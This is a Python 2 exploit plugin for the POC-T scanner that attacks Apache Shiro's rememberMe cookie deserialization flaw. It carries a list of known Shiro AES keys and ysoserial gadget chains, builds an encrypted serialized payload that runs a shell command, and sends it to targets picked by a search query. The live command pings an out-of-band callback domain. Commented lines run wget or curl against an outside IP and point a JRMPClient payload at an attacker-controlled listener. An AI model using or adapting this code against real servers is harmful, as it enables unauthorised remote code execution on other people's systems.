#coding: utf-8
# usage: shiro-unserial-rce
#   python POC-T.py -s shiro-unserial-rce -aF "\"jeecms\"&&asn=4538"

# rm -rf script/shiro-unserial-rce.py*
# mv shiro-unserial-rce.py script/ && python POC-T.py -s shiro-unserial-rce -aF "\"jeecms\"&&asn=4538"

import os
import re
import time
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES

#JAR_FILE = 'ysoserial-master-SNAPSHOT.jar'
JAR_FILE = '/home/poc/ysoserial-0.0.5-SNAPSHOT-all.jar'

keys = ['Z3VucwAAAAAAAAAAAAAAAA==','kPH+bIxk5D2deZiIxcaaaA==','4AvVhmFLUs0KTA3Kprsdag==','3AvVhmFLUs0KTA3Kprsdag==','2AvVhdsgUs0FSA3SDFAdag==','wGiHplamyXlVB11UXWol8g==','fCq+/xW488hMTCD+cmJ3aQ==','1QWLxg+NYmxraMoxAXu/Iw==','ZUdsaGJuSmxibVI2ZHc9PQ==','L7RioUULEFhRyxM7a2R/Yg== ','6ZmI6I2j5Y+R5aSn5ZOlAA==','r0e3c16IdVkouZgk1TKVMg==','ZWvohmPdUsAWT3=KpPqda','5aaC5qKm5oqA5pyvAAAAAA==','bWluZS1hc3NldC1rZXk6QQ==','a2VlcE9uR29pbmdBbmRGaQ==','WcfHGU25gNnTxTlmJMeSpw==','LEGEND-CAMPUS-CIPHERKEY==','3AvVhmFLUs0KTA3Kprsdag==']
lis = ["BeanShell1","C3P0","Clojure","CommonsBeanutils1","CommonsCollections1","CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections5","CommonsCollections6","FileUpload1","Groovy1","Hibernate1","Hibernate2","JBossInterceptors1","JRMPClient","JRMPListener","JSON1","JavassistWeld1","Jdk7u21","Jython1","MozillaRhino1","Myfaces1","Myfaces2","ROME","Spring1","Spring2","URLDNS","Wicket1",]
#keys = ['4AvVhmFLUs0KTA3Kprsdag==','']
def poc(url):

    #rce_command="wget 121.36.134.150 || curl 121.36.134.150"
    #rce_command="ping -n 3 80.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org || ping -c 3 80.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org"
    rce_command="ping 80.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org"
    #rce_command="ping -n 3 {0}.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org || ping -c 3 {1}.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org".format(target[0],target[1])
    
    if '://' not in url :

        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
        #x.443.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org 
        
        #rce_command="ping -n 3 xx.443.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org || ping -c 3 xx.443.6a3c9891605ab5c0f15e6a1d39d6dc45.tu4.org"
    # for func in lis:
        # for key in keys:
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    func = "CommonsCollections2"
    try:
        payload = generator(rce_command, JAR_FILE,key,func)  # 生成payload
        #print payload
        #print payload.decode()
        #exit()
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10,verify=False)  # 发送验证请求
    except Exception, e:
        #print(e)
        pass
    return False
    
    
def generator(command, fp,aeskey,func):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    
    popen = subprocess.Popen(['java', '-jar', fp,func, command],stdout=subprocess.PIPE)
 
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = aeskey
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
    
#poc('http://192.168.66.38:86','39.108.99.6:1099',keys[1],'JRMPClient')   #www.test.com替换成目标主机的链接，114.118.80.138替换成自己